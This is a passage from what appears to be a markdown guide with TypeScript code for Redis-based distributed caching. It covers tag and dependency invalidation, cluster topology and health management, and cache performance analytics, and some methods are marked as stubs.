hotKeys.push(tagInfo.key);\n            }\n          }\n        } catch (error) {\n          // Skip invalid entries\n          continue;\n        }\n      }\n    });\n    \n    return new Promise((resolve) => {\n      stream.on('end', () => {\n        // Generate recommendations\n        if (coldKeys.length > hotKeys.length * 0.5) {\n          recommendations.push('Consider reducing cache TTL or implementing more aggressive eviction');\n        }\n        \n        if (coldKeys.length > 1000) {\n          recommendations.push('Large number of cold keys detected - consider cleanup');\n        }\n        \n        resolve({\n          coldKeys,\n          hotKeys,\n          recommendations\n        });\n      });\n    });\n  }\n\n  // Update access time for cache entries\n  async updateAccessTime(key: string): Promise<void> {\n    const keyInfo = `${this.keyPrefix}${key}`;\n    await this.redis.hset(keyInfo, 'lastAccessed', Date.now());\n  }\n\n  // Get cache entry tags and metadata\n  async getCacheMetadata(key: string): Promise<CacheTag | null> {\n    const tagInfo = await this.redis.hgetall(`${this.keyPrefix}${key}`);\n    \n    if (Object.keys(tagInfo).length === 0) {\n      return null;\n    }\n    \n    return {\n      key: tagInfo.key,\n      tags: JSON.parse(tagInfo.tags || '[]'),\n      dependencies: JSON.parse(tagInfo.dependencies || '[]'),\n      ttl: parseInt(tagInfo.ttl),\n      createdAt: parseInt(tagInfo.createdAt),\n      lastAccessed: parseInt(tagInfo.lastAccessed)\n    };\n  }\n\n  // Queue invalidation for batch processing\n  private async queueInvalidation(event: InvalidationEvent): Promise<void> {\n    await this.redis.lpush(this.invalidationQueue, JSON.stringify(event));\n    this.emit('invalidation:queued', event);\n  }\n\n  // Process invalidation queue\n  private setupInvalidationWorker(): void {\n    const processQueue = async () => {\n      try {\n        const eventStr = await this.redis.brpop(this.invalidationQueue, 1);\n        \n        if (eventStr && eventStr[1]) {\n          const event: InvalidationEvent = JSON.parse(eventStr[1]);\n          await this.processInvalidationEvent(event);\n          \n          // Process next item immediately if queue is not empty\n          setImmediate(processQueue);\n        } else {\n          // No items in queue, wait before checking again\n          setTimeout(processQueue, 1000);\n        }\n      } catch (error) {\n        console.error('Invalidation worker error:', error);\n        setTimeout(processQueue, 5000); // Wait 5 seconds on error\n      }\n    };\n    \n    // Start the worker\n    processQueue();\n  }\n\n  // Process individual invalidation events\n  private async processInvalidationEvent(event: InvalidationEvent): Promise<void> {\n    const pipeline = this.redis.pipeline();\n    let keysToInvalidate: string[] = [];\n    \n    switch (event.type) {\n      case 'tag': {\n        const tag = event.target as string;\n        keysToInvalidate = await this.redis.smembers(`${this.tagPrefix}${tag}`);\n        \n        // Remove the tag set\n        pipeline.del(`${this.tagPrefix}${tag}`);\n        break;\n      }\n      \n      case 'dependency': {\n        const dependency = event.target as string;\n        keysToInvalidate = await this.redis.smembers(`${this.dependencyPrefix}${dependency}`);\n        \n        // Remove the dependency set\n        pipeline.del(`${this.dependencyPrefix}${dependency}`);\n        break;\n      }\n      \n      case 'pattern': {\n        const pattern = event.target as string;\n        keysToInvalidate = await this.redis.keys(pattern);\n        break;\n      }\n      \n      case 'key': {\n        keysToInvalidate = Array.isArray(event.target) ? event.target : [event.target];\n        break;\n      }\n    }\n    \n    // Remove actual cache keys and their metadata\n    keysToInvalidate.forEach(key => {\n      pipeline.del(key);\n      pipeline.del(`${this.keyPrefix}${key}`);\n    });\n    \n    await pipeline.exec();\n    \n    this.emit('invalidation:processed', {\n      event,\n      keysInvalidated: keysToInvalidate.length,\n      keys: keysToInvalidate\n    });\n  }\n\n  // Get invalidation statistics\n  async getInvalidationStats(timeWindow: number = 3600000): Promise<{\n    totalInvalidations: number;\n    invalidationsByType: Record<string, number>;\n    averageKeysPerInvalidation: number;\n    queueLength: number;\n  }> {\n    const queueLength = await this.redis.llen(this.invalidationQueue);\n    \n    // In a real implementation, you'd store invalidation history\n    // For now, return basic stats\n    return {\n      totalInvalidations: 0,\n      invalidationsByType: {\n        tag: 0,\n        dependency: 0,\n        pattern: 0,\n        key: 0\n      },\n      averageKeysPerInvalidation: 0,\n      queueLength\n    };\n  }\n}\n\n// Event-driven invalidation using message queues\nexport class EventDrivenInvalidation extends EventEmitter {\n  private tagManager: TagBasedInvalidationManager;\n  private eventSubscriptions: Map<string, (data: any) => Promise<void>> = new Map();\n\n  constructor(tagManager: TagBasedInvalidationManager, redis: Redis) {\n    super();\n    this.tagManager = tagManager;\n    this.setupEventSubscriptions(redis);\n  }\n\n  // Subscribe to data change events\n  subscribeToDataChanges(entity: string, callback: (data: any) => Promise<void>): void {\n    const channel = `data:changed:${entity}`;\n    this.eventSubscriptions.set(channel, callback);\n  }\n\n  // Publish data change event\n  async publishDataChange(entity: string, data: any): Promise<void> {\n    // Publish to message queue for cache invalidation\n    this.emit('data:changed', { entity, data });\n    \n    // Trigger cache invalidation based on entity type\n    await this.handleDataChange(entity, data);\n  }\n\n  private async handleDataChange(entity: string, data: any): Promise<void> {\n    // Default invalidation strategies based on entity type\n    switch (entity) {\n      case 'user':\n        await this.tagManager.invalidateByTags([\n          `user:${data.id}`,\n          `user:profile:${data.id}`,\n          'user:list'\n        ], `User ${data.id} updated`);\n        break;\n        \n      case 'product':\n        await this.tagManager.invalidateByTags([\n          `product:${data.id}`,\n          `category:${data.categoryId}`,\n          'product:list',\n          'product:featured'\n        ], `Product ${data.id} updated`);\n        break;\n        \n      case 'order':\n        await this.tagManager.invalidateByTags([\n          `order:${data.id}`,\n          `user:orders:${data.userId}`,\n          'order:stats'\n        ], `Order ${data.id} updated`);\n        break;\n        \n      default:\n        // Generic invalidation\n        await this.tagManager.invalidateByTags([\n          `${entity}:${data.id}`,\n          `${entity}:list`\n        ], `${entity} ${data.id} updated`);\n    }\n  }\n\n  private setupEventSubscriptions(redis: Redis): void {\n    // Subscribe to Redis pub/sub for data change events\n    const subscriber = redis.duplicate();\n    \n    subscriber.on('message', async (channel: string, message: string) => {\n      try {\n        const data = JSON.parse(message);\n        const handler = this.eventSubscriptions.get(channel);\n        \n        if (handler) {\n          await handler(data);\n        }\n      } catch (error) {\n        console.error('Event processing error:', error);\n      }\n    });\n    \n    // Subscribe to all data change channels\n    this.eventSubscriptions.forEach((_, channel) => {\n      subscriber.subscribe(channel);\n    });\n  }\n}\n```\n\n## Distributed Cache Cluster Management\n\n### Redis Cluster Implementation\n```typescript\n// src/distributed/cluster/RedisCluster.ts\nimport Redis, { Cluster } from 'ioredis';\nimport { EventEmitter } from 'events';\n\nexport interface ClusterNode {\n  host: string;\n  port: number;\n  role: 'master' | 'slave';\n  id: string;\n  slots: number[];\n  health: 'healthy' | 'degraded' | 'failed';\n  lastHealthCheck: number;\n}\n\nexport interface ClusterMetrics {\n  totalNodes: number;\n  masterNodes: number;\n  slaveNodes: number;\n  healthyNodes: number;\n  totalSlots: number;\n  coveredSlots: number;\n  keyDistribution: Map<string, number>;\n  networkLatency: Map<string, number>;\n  memoryUsage: Map<string, number>;\n}\n\nexport class RedisClusterManager extends EventEmitter {\n  private cluster: Cluster;\n  private nodes: Map<string, ClusterNode> = new Map();\n  private healthCheckInterval: NodeJS.Timeout | null = null;\n  private rebalanceInterval: NodeJS.Timeout | null = null;\n\n  constructor(seedNodes: Array<{ host: string; port: number }>, options?: any) {\n    super();\n    \n    this.cluster = new Redis.Cluster(seedNodes, {\n      enableReadyCheck: true,\n      redisOptions: {\n        password: options?.password,\n        db: 0,\n        family: 4,\n        keepAlive: true,\n        lazyConnect: true,\n        maxRetriesPerRequest: 3,\n        retryDelayOnFailover: 100,\n        maxRetriesPerRequest: null,\n        retryDelayOnClusterDown: 300,\n      },\n      scaleReads: 'slave',\n      maxRedirections: 16,\n      retryDelayOnFailover: 100,\n      enableOfflineQueue: false,\n      ...options\n    });\n\n    this.setupEventListeners();\n    this.startHealthMonitoring();\n  }\n\n  private setupEventListeners(): void {\n    this.cluster.on('connect', () => {\n      console.log('Connected to Redis cluster');\n      this.updateClusterTopology();\n      this.emit('cluster:connected');\n    });\n\n    this.cluster.on('ready', () => {\n      console.log('Redis cluster is ready');\n      this.emit('cluster:ready');\n    });\n\n    this.cluster.on('error', (error) => {\n      console.error('Redis cluster error:', error);\n      this.emit('cluster:error', error);\n    });\n\n    this.cluster.on('close', () => {\n      console.log('Redis cluster connection closed');\n      this.emit('cluster:closed');\n    });\n\n    this.cluster.on('reconnecting', () => {\n      console.log('Reconnecting to Redis cluster');\n      this.emit('cluster:reconnecting');\n    });\n\n    this.cluster.on('node error', (error, node) => {\n      console.error(`Node error [${node.options.host}:${node.options.port}]:`, error);\n      this.handleNodeError(node, error);\n    });\n  }\n\n  private async updateClusterTopology(): Promise<void> {\n    try {\n      const clusterNodes = await this.cluster.cluster('nodes');\n      const nodeLines = clusterNodes.split('\\n').filter(line => line.trim());\n      \n      this.nodes.clear();\n      \n      for (const line of nodeLines) {\n        const parts = line.split(' ');\n        if (parts.length < 8) continue;\n        \n        const [id, endpoint, flags, master, pingSent, pongRecv, configEpoch, linkState, ...slots] = parts;\n        const [host, port] = endpoint.split(':');\n        \n        const node: ClusterNode = {\n          host,\n          port: parseInt(port),\n          role: flags.includes('master') ? 'master' : 'slave',\n          id,\n          slots: this.parseSlots(slots),\n          health: linkState === 'connected' ? 'healthy' : 'failed',\n          lastHealthCheck: Date.now()\n        };\n        \n        this.nodes.set(id, node);\n      }\n      \n      this.emit('topology:updated', {\n        totalNodes: this.nodes.size,\n        masters: Array.from(this.nodes.values()).filter(n => n.role === 'master').length,\n        slaves: Array.from(this.nodes.values()).filter(n => n.role === 'slave').length\n      });\n      \n    } catch (error) {\n      console.error('Failed to update cluster topology:', error);\n    }\n  }\n\n  private parseSlots(slots: string[]): number[] {\n    const slotRanges: number[] = [];\n    \n    for (const slot of slots) {\n      if (slot.includes('-')) {\n        const [start, end] = slot.split('-').map(s => parseInt(s));\n        for (let i = start; i <= end; i++) {\n          slotRanges.push(i);\n        }\n      } else {\n        const slotNum = parseInt(slot);\n        if (!isNaN(slotNum)) {\n          slotRanges.push(slotNum);\n        }\n      }\n    }\n    \n    return slotRanges;\n  }\n\n  private handleNodeError(node: any, error: Error): void {\n    const nodeKey = `${node.options.host}:${node.options.port}`;\n    const nodeInfo = Array.from(this.nodes.values()).find(n => \n      n.host === node.options.host && n.port === node.options.port\n    );\n    \n    if (nodeInfo) {\n      nodeInfo.health = 'failed';\n      nodeInfo.lastHealthCheck = Date.now();\n      \n      this.emit('node:failed', {\n        node: nodeInfo,\n        error: error.message\n      });\n      \n      // Attempt automatic failover if this is a master node\n      if (nodeInfo.role === 'master') {\n        this.handleMasterFailure(nodeInfo);\n      }\n    }\n  }\n\n  private async handleMasterFailure(masterNode: ClusterNode): Promise<void> {\n    console.log(`Master node ${masterNode.host}:${masterNode.port} failed, attempting failover`);\n    \n    try {\n      // Find slave nodes for this master\n      const slaveNodes = Array.from(this.nodes.values()).filter(node => \n        node.role === 'slave' && node.health === 'healthy'\n      );\n      \n      if (slaveNodes.length > 0) {\n        // Promote a slave to master\n        const slaveToPromote = slaveNodes[0];\n        await this.promoteSlaveToMaster(slaveToPromote);\n        \n        this.emit('failover:completed', {\n          failedMaster: masterNode,\n          newMaster: slaveToPromote\n        });\n      } else {\n        console.error('No healthy slave nodes available for failover');\n        this.emit('failover:failed', {\n          failedMaster: masterNode,\n          reason: 'No healthy slaves available'\n        });\n      }\n    } catch (error) {\n      console.error('Failover failed:', error);\n      this.emit('failover:failed', {\n        failedMaster: masterNode,\n        error: error.message\n      });\n    }\n  }\n\n  private async promoteSlaveToMaster(slaveNode: ClusterNode): Promise<void> {\n    // This would typically involve cluster management commands\n    // Implementation depends on specific Redis cluster setup\n    console.log(`Promoting slave ${slaveNode.host}:${slaveNode.port} to master`);\n    \n    // Update local topology\n    slaveNode.role = 'master';\n    await this.updateClusterTopology();\n  }\n\n  private startHealthMonitoring(): void {\n    this.healthCheckInterval = setInterval(async () => {\n      await this.performHealthCheck();\n    }, 30000); // Check every 30 seconds\n\n    this.rebalanceInterval = setInterval(async () => {\n      await this.checkForRebalancing();\n    }, 300000); // Check every 5 minutes\n  }\n\n  private async performHealthCheck(): Promise<void> {\n    const healthPromises = Array.from(this.nodes.values()).map(async (node) => {\n      const startTime = Date.now();\n      \n      try {\n        // Simple ping to check node health\n        const nodeClient = new Redis({\n          host: node.host,\n          port: node.port,\n          connectTimeout: 5000,\n          commandTimeout: 5000\n        });\n        \n        await nodeClient.ping();\n        await nodeClient.quit();\n        \n        const latency = Date.now() - startTime;\n        \n        node.health = latency > 1000 ? 'degraded' : 'healthy';\n        node.lastHealthCheck = Date.now();\n        \n        return {\n          node,\n          healthy: true,\n          latency\n        };\n      } catch (error) {\n        node.health = 'failed';\n        node.lastHealthCheck = Date.now();\n        \n        return {\n          node,\n          healthy: false,\n          error: error.message\n        };\n      }\n    });\n\n    const results = await Promise.allSettled(healthPromises);\n    const healthReport = results.map(result => \n      result.status === 'fulfilled' ? result.value : null\n    ).filter(Boolean);\n\n    this.emit('health:checked', healthReport);\n  }\n\n  private async checkForRebalancing(): Promise<void> {\n    try {\n      const keyDistribution = await this.getKeyDistribution();\n      const threshold = 0.2; // 20% variance threshold\n      \n      const avgKeysPerNode = Array.from(keyDistribution.values())\n        .reduce((sum, count) => sum + count, 0) / keyDistribution.size;\n      \n      const needsRebalancing = Array.from(keyDistribution.values())\n        .some(count => Math.abs(count - avgKeysPerNode) / avgKeysPerNode > threshold);\n      \n      if (needsRebalancing) {\n        this.emit('rebalance:needed', {\n          keyDistribution,\n          avgKeysPerNode,\n          threshold\n        });\n        \n        // Automatic rebalancing would be implemented here\n        await this.performRebalancing();\n      }\n    } catch (error) {\n      console.error('Rebalancing check failed:', error);\n    }\n  }\n\n  private async getKeyDistribution(): Promise<Map<string, number>> {\n    const distribution = new Map<string, number>();\n    \n    for (const node of this.nodes.values()) {\n      if (node.role === 'master' && node.health === 'healthy') {\n        try {\n          const nodeClient = new Redis({\n            host: node.host,\n            port: node.port\n          });\n          \n          const info = await nodeClient.info('keyspace');\n          const keyCount = this.parseKeyCount(info);\n          \n          distribution.set(`${node.host}:${node.port}`, keyCount);\n          \n          await nodeClient.quit();\n        } catch (error) {\n          distribution.set(`${node.host}:${node.port}`, 0);\n        }\n      }\n    }\n    \n    return distribution;\n  }\n\n  private parseKeyCount(info: string): number {\n    const match = info.match(/keys=(\\d+)/);\n    return match ? parseInt(match[1]) : 0;\n  }\n\n  private async performRebalancing(): Promise<void> {\n    console.log('Starting cluster rebalancing...');\n    \n    // This would implement slot migration logic\n    // For now, just emit an event\n    this.emit('rebalance:started');\n    \n    // Simulate rebalancing work\n    setTimeout(() => {\n      this.emit('rebalance:completed');\n    }, 10000);\n  }\n\n  // Public API methods\n  async getClusterInfo(): Promise<{\n    nodes: ClusterNode[];\n    metrics: ClusterMetrics;\n    health: 'healthy' | 'degraded' | 'critical';\n  }> {\n    await this.updateClusterTopology();\n    \n    const nodes = Array.from(this.nodes.values());\n    const healthyNodes = nodes.filter(n => n.health === 'healthy');\n    const totalSlots = 16384; // Redis cluster total slots\n    const coveredSlots = nodes\n      .filter(n => n.role === 'master')\n      .reduce((sum, n) => sum + n.slots.length, 0);\n    \n    const keyDistribution = await this.getKeyDistribution();\n    \n    const metrics: ClusterMetrics = {\n      totalNodes: nodes.length,\n      masterNodes: nodes.filter(n => n.role === 'master').length,\n      slaveNodes: nodes.filter(n => n.role === 'slave').length,\n      healthyNodes: healthyNodes.length,\n      totalSlots,\n      coveredSlots,\n      keyDistribution,\n      networkLatency: new Map(), // Would be populated from health checks\n      memoryUsage: new Map() // Would be populated from node info\n    };\n    \n    let health: 'healthy' | 'degraded' | 'critical' = 'healthy';\n    \n    if (healthyNodes.length < nodes.length * 0.5) {\n      health = 'critical';\n    } else if (healthyNodes.length < nodes.length * 0.8) {\n      health = 'degraded';\n    }\n    \n    return {\n      nodes,\n      metrics,\n      health\n    };\n  }\n\n  async addNode(host: string, port: number): Promise<void> {\n    try {\n      // Add node to cluster\n      const result = await this.cluster.cluster('meet', host, port);\n      console.log(`Added node ${host}:${port} to cluster:, result`);\n      \n      await this.updateClusterTopology();\n      \n      this.emit('node:added', { host, port });\n    } catch (error) {\n      console.error(`Failed to add node ${host}:${port}:`, error);\n      throw error;\n    }\n  }\n\n  async removeNode(nodeId: string): Promise<void> {\n    try {\n      const node = this.nodes.get(nodeId);\n      if (!node) {\n        throw new Error(`Node ${nodeId} not found`);\n      }\n      \n      // Remove node from cluster\n      await this.cluster.cluster('forget', nodeId);\n      console.log(`Removed node ${nodeId} from cluster`);\n      \n      this.nodes.delete(nodeId);\n      \n      this.emit('node:removed', { nodeId, node });\n    } catch (error) {\n      console.error(`Failed to remove node ${nodeId}:`, error);\n      throw error;\n    }\n  }\n\n  async disconnect(): Promise<void> {\n    if (this.healthCheckInterval) {\n      clearInterval(this.healthCheckInterval);\n    }\n    \n    if (this.rebalanceInterval) {\n      clearInterval(this.rebalanceInterval);\n    }\n    \n    await this.cluster.disconnect();\n    this.emit('cluster:disconnected');\n  }\n\n  // Expose cluster client for direct operations\n  getClusterClient(): Cluster {\n    return this.cluster;\n  }\n}\n```\n\n## Performance Monitoring and Analytics\n\n### Comprehensive Cache Analytics\n```typescript\n// src/monitoring/metrics/CacheAnalytics.ts\nimport { EventEmitter } from 'events';\nimport { promisify } from 'util';\n\nexport interface CacheOperation {\n  type: 'get' | 'set' | 'delete' | 'invalidate';\n  key: string;\n  hit: boolean;\n  latency: number;\n  size?: number;\n  tier?: string;\n  timestamp: number;\n  userId?: string;\n  region?: string;\n}\n\nexport interface CacheAnalysisReport {\n  timeRange: {\n    start: number;\n    end: number;\n  };\n  overview: {\n    totalOperations: number;\n    hitRate: number;\n    missRate: number;\n    averageLatency: number;\n    totalDataTransferred: number;\n    costSavings: number;\n  };\n  trends: {\n    hitRateOverTime: Array<{ timestamp: number; hitRate: number }>;\n    latencyOverTime: Array<{ timestamp: number; latency: number }>;\n    operationsOverTime: Array<{ timestamp: number; operations: number }>;\n  };\n  topKeys: {\n    mostAccessed: Array<{ key: string; accessCount: number; hitRate: number }>;\n    slowestKeys: Array<{ key: string; averageLatency: number; accessCount: number }>;\n    largestKeys: Array<{ key: string; size: number; accessCount: number }>;\n  };\n  patterns: {\n    accessPatterns: Array<{ pattern: string; frequency: number }>;\n    temporalPatterns: Array<{ hour: number; operations: number; hitRate: number }>;\n    geographicPatterns: Array<{ region: string; operations: number; hitRate: number }>;\n  };\n  recommendations: string[];\n  alerts: Array<{\n    type: 'performance' | 'capacity' | 'cost' | 'reliability';\n    severity: 'low' | 'medium' | 'high' | 'critical';\n    message: string;\n    suggestion: string;\n  }>;\n}\n\nexport class CacheAnalytics extends EventEmitter {\n  private operations: CacheOperation[] = [];\n  private maxOperations: number = 100000; // Keep last 100k operations\n  private analysisWindow: number = 3600000; // 1 hour default window\n  private keyPatterns: Map<string, number> = new Map();\n  private hourlyStats: Map<number, { operations: number; hits: number; totalLatency: number }> = new Map();\n\n  constructor(config?: {\n    maxOperations?: number;\n    analysisWindow?: number;\n  }) {\n    super();\n    \n    if (config?.maxOperations) {\n      this.maxOperations = config.maxOperations;\n    }\n    \n    if (config?.analysisWindow) {\n      this.analysisWindow = config.analysisWindow;\n    }\n    \n    // Initialize hourly stats\n    for (let hour = 0; hour < 24; hour++) {\n      this.hourlyStats.set(hour, { operations: 0, hits: 0, totalLatency: 0 });\n    }\n  }\n\n  // Record a cache operation\n  recordOperation(operation: CacheOperation): void {\n    // Add timestamp if not provided\n    if (!operation.timestamp) {\n      operation.timestamp = Date.now();\n    }\n\n    this.operations.push(operation);\n    \n    // Maintain size limit\n    if (this.operations.length > this.maxOperations) {\n      this.operations.shift();\n    }\n\n    // Update key patterns\n    this.updateKeyPatterns(operation.key);\n    \n    // Update hourly stats\n    this.updateHourlyStats(operation);\n    \n    // Emit operation event for real-time monitoring\n    this.emit('operation:recorded', operation);\n    \n    // Check for performance issues\n    this.checkPerformanceThresholds(operation);\n  }\n\n  private updateKeyPatterns(key: string): void {\n    // Extract patterns from keys (e.g., user:*, product:category:*)\n    const patterns = this.extractPatterns(key);\n    \n    patterns.forEach(pattern => {\n      this.keyPatterns.set(pattern, (this.keyPatterns.get(pattern) || 0) + 1);\n    });\n  }\n\n  private extractPatterns(key: string): string[] {\n    const patterns: string[] = [];\n    const parts = key.split(':');\n    \n    // Generate patterns at different levels\n    for (let i = 1; i <= parts.length; i++) {\n      const pattern = parts.slice(0, i).join(':') + (i < parts.length ? ':*' : '');\n      patterns.push(pattern);\n    }\n    \n    return patterns;\n  }\n\n  private updateHourlyStats(operation: CacheOperation): void {\n    const hour = new Date(operation.timestamp).getHours();\n    const stats = this.hourlyStats.get(hour)!;\n    \n    stats.operations++;\n    stats.totalLatency += operation.latency;\n    \n    if (operation.hit) {\n      stats.hits++;\n    }\n  }\n\n  private checkPerformanceThresholds(operation: CacheOperation): void {\n    // Check for slow operations\n    if (operation.latency > 1000) { // 1 second threshold\n      this.emit('alert:slow-operation', {\n        key: operation.key,\n        latency: operation.latency,\n        threshold: 1000\n      });\n    }\n    \n    // Check for large objects\n    if (operation.size && operation.size > 1024 * 1024) { // 1MB threshold\n      this.emit('alert:large-object', {\n        key: operation.key,\n        size: operation.size,\n        threshold: 1024 * 1024\n      });\n    }\n  }\n\n  // Generate comprehensive analysis report\n  async generateReport(timeRange?: { start: number; end: number }): Promise<CacheAnalysisReport> {\n    const now = Date.now();\n    const range = timeRange || {\n      start: now - this.analysisWindow,\n      end: now\n    };\n\n    // Filter operations within time range\n    const operationsInRange = this.operations.filter(op => \n      op.timestamp >= range.start && op.timestamp <= range.end\n    );\n\n    const overview = this.calculateOverview(operationsInRange);\n    const trends = this.calculateTrends(operationsInRange, range);\n    const topKeys = this.analyzeTopKeys(operationsInRange);\n    const patterns = this.analyzePatterns(operationsInRange);\n    const recommendations = this.generateRecommendations(operationsInRange, overview);\n    const alerts = this.generateAlerts(overview, topKeys);\n\n    return {\n      timeRange: range,\n      overview,\n      trends,\n      topKeys,\n      patterns,\n      recommendations,\n      alerts\n    };\n  }\n\n  private calculateOverview(operations: CacheOperation[]): CacheAnalysisReport['overview'] {\n    if (operations.length === 0) {\n      return {\n        totalOperations: 0,\n        hitRate: 0,\n        missRate: 0,\n        averageLatency: 0,\n        totalDataTransferred: 0,\n        costSavings: 0\n      };\n    }\n\n    const hits = operations.filter(op => op.hit).length;\n    const totalLatency = operations.reduce((sum, op) => sum + op.latency, 0);\n    const totalSize = operations.reduce((sum, op) => sum + (op.size || 0), 0);\n    \n    const hitRate = (hits / operations.length) * 100;\n    const averageLatency = totalLatency / operations.length;\n    \n    // Estimate cost savings (assuming cache hits are 10x faster than misses)\n    const avgMissLatency = 500; // Estimated database query time\n    const avgCacheLatency = 50; // Estimated cache response time\n    const timeSaved = hits * (avgMissLatency - avgCacheLatency);\n    const costSavings = timeSaved * 0.001; // Rough cost estimation\n\n    return {\n      totalOperations: operations.length,\n      hitRate,\n      missRate: 100 - hitRate,\n      averageLatency,\n      totalDataTransferred: totalSize,\n      costSavings\n    };\n  }\n\n  private calculateTrends(operations: CacheOperation[], range: { start: number; end: number }): CacheAnalysisReport['trends'] {\n    const bucketSize = Math.max(1, Math.floor((range.end - range.start) / 50)); // 50 time buckets\n    const buckets = new Map<number, { operations: number; hits: number; totalLatency: number }>();\n\n    // Initialize buckets\n    for (let time = range.start; time < range.end; time += bucketSize) {\n      buckets.set(time, { operations: 0, hits: 0, totalLatency: 0 });\n    }\n\n    // Populate buckets\n    operations.forEach(op => {\n      const bucketTime = Math.floor((op.timestamp - range.start) / bucketSize) * bucketSize + range.start;\n      const bucket = buckets.get(bucketTime);\n      \n      if (bucket) {\n        bucket.operations++;\n        bucket.totalLatency += op.latency;\n        \n        if (op.hit) {\n          bucket.hits++;\n        }\n      }\n    });\n\n    // Convert to trend arrays\n    const hitRateOverTime = Array.from(buckets.entries()).map(([timestamp, bucket]) => ({\n      timestamp,\n      hitRate: bucket.operations > 0 ? (bucket.hits / bucket.operations) * 100 : 0\n    }));\n\n    const latencyOverTime = Array.from(buckets.entries()).map(([timestamp, bucket]) => ({\n      timestamp,\n      latency: bucket.operations > 0 ? bucket.totalLatency / bucket.operations : 0\n    }));\n\n    const operationsOverTime = Array.from(buckets.entries()).map(([timestamp, bucket]) => ({\n      timestamp,\n      operations: bucket.operations\n    }));\n\n    return {\n      hitRateOverTime,\n      latencyOverTime,\n      operationsOverTime\n    };\n  }\n\n  private analyzeTopKeys(operations: CacheOperation[]): CacheAnalysisReport['topKeys'] {\n    const keyStats = new Map<string, {\n      accessCount: number;\n      hits: number;\n      totalLatency: number;\n      size: number;\n    }>();\n\n    // Aggregate key statistics\n    operations.forEach(op => {\n      const stats = keyStats.get(op.key) || {\n        accessCount: 0,\n        hits: 0,\n        totalLatency: 0,\n        size: 0\n      };\n\n      stats.accessCount++;\n      stats.totalLatency += op.latency;\n      \n      if (op.hit) {\n        stats.hits++;\n      }\n      \n      if (op.size) {\n        stats.size = Math.max(stats.size, op.size);\n      }\n\n      keyStats.set(op.key, stats);\n    });\n\n    // Sort and extract top keys by different criteria\n    const keyStatsArray = Array.from(keyStats.entries()).map(([key, stats]) => ({\n      key,\n      accessCount: stats.accessCount,\n      hitRate: (stats.hits / stats.accessCount) * 100,\n      averageLatency: stats.totalLatency / stats.accessCount,\n      size: stats.size\n    }));\n\n    const mostAccessed = keyStatsArray\n      .sort((a, b) => b.accessCount - a.accessCount)\n      .slice(0, 20)\n      .map(({ key, accessCount, hitRate }) => ({ key, accessCount, hitRate }));\n\n    const slowestKeys = keyStatsArray\n      .sort((a, b) => b.averageLatency - a.averageLatency)\n      .slice(0, 20)\n      .map(({ key, averageLatency, accessCount }) => ({ key, averageLatency, accessCount }));\n\n    const largestKeys = keyStatsArray\n      .filter(k => k.size > 0)\n      .sort((a, b) => b.size - a.size)\n      .slice(0, 20)\n      .map(({ key, size, accessCount }) => ({ key, size, accessCount }));\n\n    return {\n      mostAccessed,\n      slowestKeys,\n      largestKeys\n    };\n  }\n\n  private analyzePatterns(operations: CacheOperation[]): CacheAnalysisReport['patterns'] {\n    // Access patterns based on key patterns\n    const accessPatterns = Array.from(this.keyPatterns.entries())\n      .sort((a, b) => b[1] - a[1])\n      .slice(0, 20)\n      .map(([pattern, frequency]) => ({ pattern, frequency }));\n\n    // Temporal patterns (hourly)\n    const hourlyOperations = new Map<number, { operations: number; hits: number }>();\n    \n    operations.forEach(op => {\n      const hour = new Date(op.timestamp).getHours();\n      const stats = hourlyOperations.get(hour) || { operations: 0, hits: 0 };\n      \n      stats.operations++;\n      if (op.hit) {\n        stats.hits++;\n      }\n      \n      hourlyOperations.set(hour, stats);\n    });\n\n    const temporalPatterns = Array.from(hourlyOperations.entries())\n      .map(([hour, stats]) => ({\n        hour,\n        operations: stats.operations,\n        hitRate: stats.operations > 0 ? (stats.hits / stats.operations) * 100 : 0\n      }))\n      .sort((a, b) => a.hour - b.hour);\n\n    // Geographic patterns (if region data available)\n    const regionOperations = new Map<string, { operations: number; hits: number }>();\n    \n    operations.forEach(op => {\n      if (op.region) {\n        const stats = regionOperations.get(op.region) || { operations: 0, hits: 0 };\n        \n        stats.operations++;\n        if (op.hit) {\n          stats.hits++;\n        }\n        \n        regionOperations.set(op.region, stats);\n      }\n    });\n\n    const geographicPatterns = Array.from(regionOperations.entries())\n      .map(([region, stats]) => ({\n        region,\n        operations: stats.operations,\n        hitRate: stats.operations > 0 ? (stats.hits / stats.operations) * 100 : 0\n      }))\n      .sort((a, b) => b.operations - a.operations);\n\n    return {\n      accessPatterns,\n      temporalPatterns,\n      geographicPatterns\n    };\n  }\n\n  private generateRecommendations(operations: CacheOperation[], overview: CacheAnalysisReport['overview']): string[] {\n    const recommendations: string[] = [];\n\n    // Hit rate recommendations\n    if (overview.hitRate < 70) {\n      recommendations.push('Cache hit rate is below 70%. Consider increasing TTL or implementing cache warming strategies.');\n    }\n\n    // Latency recommendations\n    if (overview.averageLatency > 100) {\n      recommendations.push('Average cache latency is high. Consider using faster cache tier or optimizing serialization.');\n    }\n\n    // Pattern-based recommendations\n    const getOperations = operations.filter(op => op.type === 'get');\n    const missedGets = getOperations.filter(op => !op.hit);\n    \n    if (missedGets.length > getOperations.length * 0.5) {\n      recommendations.push('High cache miss rate detected. Review cache expiration policies and consider predictive caching.');\n    }\n\n    // Size-based recommendations\n    const largeObjects = operations.filter(op => op.size && op.size > 512 * 1024);\n    if (largeObjects.length > operations.length * 0.1) {\n      recommendations.push('Detected large cached objects. Consider compression or splitting large objects into smaller chunks.');\n    }\n\n    return recommendations;\n  }\n\n  private generateAlerts(overview: CacheAnalysisReport['overview'], topKeys: CacheAnalysisReport['topKeys']): CacheAnalysisReport['alerts'] {\n    const alerts: CacheAnalysisReport['alerts'] = [];\n\n    // Performance alerts\n    if (overview.hitRate < 50) {\n      alerts.push({\n        type: 'performance',\n        severity: 'critical',\n        message: 'Cache hit rate is critically low',\n        suggestion: 'Review cache configuration and implement cache warming'\n      });\n    } else if (overview.hitRate < 70) {\n      alerts.push({\n        type: 'performance',\n        severity: 'medium',\n        message: 'Cache hit rate is below optimal',\n        suggestion: 'Consider adjusting TTL values or cache size'\n      });\n    }\n\n    // Latency alerts\n    if (overview.averageLatency > 200) {\n      alerts.push({\n        type: 'performance',\n        severity: 'high',\n        message: 'High cache latency detected',\n        suggestion: 'Check network connectivity and cache server performance'\n      });\n    }\n\n    // Key-specific alerts\n    const slowKeys = topKeys.slowestKeys.filter(k => k.averageLatency > 500);\n    if (slowKeys.length > 0) {\n      alerts.push({\n        type: 'performance',\n        severity: 'medium',\n        message: `${slowKeys.length} keys have high latency`,\n        suggestion: 'Review serialization efficiency for slow keys'\n      });\n    }\n\n    return alerts;\n  }\n\n  // Real-time metrics\n  getCurrentMetrics(): {\n    hitRate: number;\n    